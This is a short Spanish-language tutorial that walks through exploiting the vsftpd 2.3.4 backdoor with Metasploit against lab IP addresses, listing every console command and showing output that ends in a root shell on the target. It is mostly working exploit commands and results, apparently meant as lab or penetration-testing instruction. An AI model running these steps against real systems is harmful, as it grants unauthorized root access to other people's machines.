# Explotación de vsftpd 2.3.4 en Linux con Metasploit

Este tutorial cubre cómo explotar la vulnerabilidad backdoor en `vsftpd 2.3.4`, una versión del servidor FTP que contiene una puerta trasera.

### 1. Iniciar Metasploit

Primero, inicia la base de datos de Metasploit y abre la consola:

```bash
$ sudo msfdb init && msfconsole
```

### 2. Seleccionar el exploit

Una vez en la consola de `Metasploit`, buscamos el exploit para `vsftpd 2.3.4`:

```bash
msf6 > search vsftpd
```

Seleccionamos el exploit adecuado:

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
```

### 3. Configurar los parámetros del exploit

Configura las direcciones IP para la máquina atacante y la máquina objetivo:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set CHOST 192.168.1.18
CHOST => 192.168.1.18

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set CPORT 1717
CPORT => 1717

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.27
RHOSTS => 192.168.1.27

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
RPORT => 21
```

Verifica las opciones configuradas para asegurarte de que todo esté correcto:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

### 4. Ejecutar el exploit

Ahora, ejecutamos el exploit:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

Deberías ver un mensaje indicando que el exploit ha sido exitoso y que has obtenido acceso al sistema:

```bash
[*] 192.168.1.27:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.27:21 - USER: 331 Please specify the password.
[+] 192.168.1.27:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.27:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.18:1717 -> 192.168.1.27:6200)
```

### 5. Acceder al shell del sistema comprometido

Una vez obtenida la shell, puedes verificar que tienes privilegios de root en la máquina comprometida:

```bash
shell> whoami
root
```

***
